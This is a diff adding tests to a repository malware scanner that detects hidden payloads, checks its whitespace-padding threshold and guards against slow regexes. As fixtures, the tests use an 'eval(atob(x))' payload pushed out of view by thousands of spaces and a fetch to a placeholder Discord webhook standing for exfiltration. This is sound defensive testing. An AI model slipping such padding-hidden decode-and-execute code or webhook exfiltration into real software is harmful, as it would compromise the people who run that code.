@@ -461,3 +461,32 @@ test("every scanner rule has Indonesian and English copy", async () => {
 		for (const id of ids) assert.equal(typeof copy[id], "string", `${lang} copy missing for rule "${id}"`);
 	}
 });
+
+// ── Security review fixes (round 4): scanner robustness against hostile repos ──
+
+test("padding that pushes a line past the length cap cannot hide the payload", () => {
+	for (const pad of [600, 3000, 5000, 20000]) {
+		const r = scan("routes/a.js", "const a = 1;\n" + " ".repeat(pad) + "eval(atob(x));");
+		assert.ok(rules(r).includes("whitespace_hidden"), `${pad} spaces: padding itself must be flagged`);
+		assert.ok(rules(r).includes("decode_exec"), `${pad} spaces: payload after the padding must still be scanned`);
+		assert.equal(r.level, LEVEL.DANGER);
+	}
+	const hook = scan("routes/a.js", " ".repeat(5000) + "fetch('https://discord.com/api/webhooks/1/a');");
+	assert.ok(rules(hook).includes("exfil_webhook"));
+});
+
+test("indented code and all-whitespace lines are not whitespace_hidden", () => {
+	assert.deepEqual(rules(scan("a.js", " ".repeat(600))), [], "blank padded line");
+	assert.deepEqual(rules(scan("a.js", " ".repeat(499) + "x();")), [], "just under the threshold");
+	assert.deepEqual(rules(scan("a.js", "\t".repeat(30) + "const x = 1;")), []);
+});
+
+// The rules run on untrusted files in the service worker: crafted lines must not be able to stall it.
+test("crafted repeated-prefix lines do not make the scanner slow", () => {
+	const N = 3990;
+	const lines = ["btoa(JSON.stringify(", "Buffer.from(", "JSON.stringify({", "URLSearchParams({", "if (", "eval(", "curl "].map((p) => p.repeat(Math.floor(N / p.length)).slice(0, N));
+	const t = performance.now();
+	scanRepo([{ path: "a.js", content: lines.flatMap((l) => Array.from({ length: 50 }, () => l)).join("\n") }]);
+	const ms = performance.now() - t;
+	assert.ok(ms < 1500, `scan took ${Math.round(ms)} ms (was ~1800 ms for the btoa case alone before bounding the regexes)`);
+});
